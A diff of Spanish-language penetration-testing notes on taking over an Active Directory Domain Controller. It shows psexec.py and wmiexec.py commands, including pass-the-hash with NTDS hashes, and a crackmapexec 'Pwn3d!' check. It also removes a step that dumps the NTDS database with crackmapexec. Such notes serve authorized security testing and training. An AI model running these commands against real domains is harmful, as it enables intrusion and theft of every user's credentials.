@@ -2,7 +2,7 @@
 Para ganar acceso al `Domain Controller` debemos disponer de credenciales válidas de un `Administrador del dominio`.
 
 # Realizar Autenticación
-Una forma de hacerlo es mediante `psexec`
+Una forma de hacerlo es mediante `psexec`, podemos saber si podemos autenticarnos si el crackmapexec nos da un `Pwn3d!` para ese equipo.
 ```
 psexec.py <dominio>/<usuario>:<contraseña>@<ip_DC> cmd.exe
 ```
@@ -19,8 +19,3 @@ Se puede hacer también con otras herramientas como `wmiexec`
 wmiexec.py <dominio>/<usuario>@<ip> -hashes <hash_ntds>
 ```
 
-# Recomendaciones
-Una vez se compromete el DC es recomendable dumpear el `ntds` de todos los equipos para tener acceso a todos los usuarios del Directorio Activo.
-```
-crackmapexec smb <ip_DC> -u 'Administrator' -p 'P@$$w0rd!' --ntds vss
-```
